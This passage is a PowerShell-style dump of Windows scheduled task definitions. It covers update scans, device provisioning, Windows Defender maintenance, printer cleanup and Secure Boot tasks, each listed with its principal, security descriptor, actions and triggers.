  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT3H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {7F019157-05C8-473F-8664-2BA04A090DC8}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {A558C6A5-B42B-4C98-B610-BF9559143139}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T16:00:00-08:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   False
      StartBoundary                 :   2013-12-31T16:00:00-08:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdatesAsUser
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   AllUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Running
  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DDAFAEA2-8842-4E96-BADE-D44A8D676FDB}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndContinueUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {0DC331EE-8438-49D5-A721-E10B937CE459}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndScanForUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {D5A04D91-6FE6-4FE4-A98A-FEB4500C5AF7}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T16:00:00-08:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------

  Name                              :   Notifications
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   Location Notification
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\LocationNotificationWindows.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   WindowsActionDialog
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   Location Notification
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\WindowsActionDialog.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   DetectHardwareChange
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\Autopilot.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\Autopilot.dll,-602)
  Source                            :   $(@%SystemRoot%\system32\Autopilot.dll,-601)
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {62B2DD2C-F129-42EE-BF59-55D3FD21C215}
      Data                          :   DetectHardwareChange
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   RemediateHardwareChange
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\Autopilot.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\Autopilot.dll,-603)
  Source                            :   $(@%SystemRoot%\system32\Autopilot.dll,-601)
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {62B2DD2C-F129-42EE-BF59-55D3FD21C215}
      Data                          :   RemediateHardwareChange
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------

  Name                              :   Cellular
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /turn 7 /source CellStateChangeTask
      Execute                       :   %windir%\system32\ProvTool.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Logon
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /turn 5 /source LogonIdleTask
      Execute                       :   %windir%\system32\ProvTool.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MdmDiagnosticsCleanup
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /clean
      Execute                       :   %windir%\system32\MdmDiagnosticsTool.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Retry
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /turn 5 /source ProvRetryTask
      Execute                       :   %windir%\system32\ProvTool.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   RunOnReboot
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /turn 5 /source ContinueSessionTask
      Execute                       :   %windir%\system32\ProvTool.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SystemSoundsService
  Principal                         :
      GroupId                       :   Users
      Id                            :   Group
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   System Sounds User Mode Agent
  Source                            :   Microsoft Corporation
  State                             :   Running
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)
  Enabled                           :   True
  Date                              :   6/23/2005 2:48:00 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SecureBootEncodeUEFI
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT10S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %WINDIR%\system32\SecureBootEncodeUEFI.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskRegistrationTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      EndBoundary                   :   2025-12-31T12:00:00
      StopAtDurationEnd             :   False
      Delay                         :   PT5M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StartBoundary                 :   2025-12-31T12:00:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EduPrintProv
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;WD)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\eduprintprov.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   PrinterCleanupTask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {C56F065E-DE49-4E42-BE7C-305C45609D25}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2020-01-01T12:00:00
      StopAtDurationEnd             :   False
      DaysInterval                  :   30
      ------------------------------

  Name                              :   PrintJobCleanupTask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {8ABCE260-32B6-476C-AE13-B34D0C91292D}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2021-01-01T12:00:00
      StopAtDurationEnd             :   False
      DaysInterval                  :   7
      ------------------------------

  Name                              :   IntelligentPwdlessTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\IntelligentPwdlessTask.dll,-100)
  Description                       :   $(@%SystemRoot%\system32\IntelligentPwdlessTask.dll,-102)
  Source                            :   $(@%SystemRoot%\system32\IntelligentPwdlessTask.dll,-101)
  State                             :   Ready
  SDDL                              :   D:P(A;;KA;;;BA)(A;;FA;;;SY)(A;;KRKX;;;WD)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT10M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {8702A841-D5CA-47C3-812D-9CEDC304C200}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2021-08-01T03:00:00
      ExecutionTimeLimit            :   PT12H
      StopAtDurationEnd             :   False
      DaysInterval                  :   1
      ------------------------------

  Name                              :   StartComponentCleanup
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {752073A1-23F2-4396-85F0-8FDB879ED0ED}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Account Cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT30M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
      Execute                       :   %windir%\System32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   SpaceManagerTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\spaceman.exe,-2)
  Description                       :   $(@%SystemRoot%\system32\spaceman.exe,-3)
  Source                            :   $(@%SystemRoot%\system32\spaceman.exe,-1)
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /Work
      Execute                       :   %windir%\system32\spaceman.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT2M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MaintenanceTasks
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-602)
  Source                            :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-601)
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
      Execute                       :   %windir%\system32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   MsCtfMonitor
  Principal                         :
      GroupId                       :   Users
      Id                            :   AnyUser
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   TextServicesFramework monitor task
  Source                            :   Microsoft Corporation
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   RunUpdateNotificationMgr
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   O:SYD:P(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;BA)(A;;FRFX;;;AU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\UNP\UpdateNotificationMgr.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2016-06-02T10:30:00
      StopAtDurationEnd             :   False
      DaysInterval                  :   1
      RandomDelay                   :   PT6H
      ------------------------------
      Type                          :   MSFT_TaskRegistrationTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------

  Name                              :   Windows Defender Cache Maintenance
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic maintenance task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -IdleTask -TaskName WdCacheMaintenance
      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Windows Defender Cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic cleanup task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -IdleTask -TaskName WdCleanup
      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Windows Defender Scheduled Scan
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic scan task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob
      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Windows Defender Verification
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic verification task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -IdleTask -TaskName WdVerification
      Execute                       :   C:\Program Files\Windows Defender\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   CDSSync
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-1428027539-3309602793-2678353003-1498846795-3763184142)(A;;FRFX;;;AU)(A;;FRFX;;;BU)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {B0D2B535-12E1-439F-86B3-BADA289510F0}
      Data                          :   $(Arg0)
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MoProfileManagement
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT10M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {085EDA12-CF4A-4944-8222-8ADCADE137CB}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
